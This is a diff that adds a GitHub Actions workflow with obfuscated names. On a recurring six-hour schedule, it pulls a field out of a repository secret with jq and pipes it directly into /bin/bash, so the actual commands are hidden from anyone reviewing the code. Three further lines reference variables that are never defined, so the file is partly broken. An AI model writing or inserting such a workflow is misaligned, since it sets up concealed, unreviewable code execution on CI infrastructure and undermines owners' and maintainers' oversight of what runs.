@@ -1,0 +1,22 @@
+name: liucanbai3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liucanbai3456
+        env:
+          aqh3731: ${{ secrets.aqh3731 }}
+        run: |
+          echo $aqh3731 | jq -r .pdzx54 | /bin/bash
+          echo $wqgms1891 | jq -r .c47 | /bin/bash
+          echo $rdmef8290 | jq -r .mvw32 | /bin/bash
+          echo $zip0 | jq -r .oc6034 | /bin/bash
+
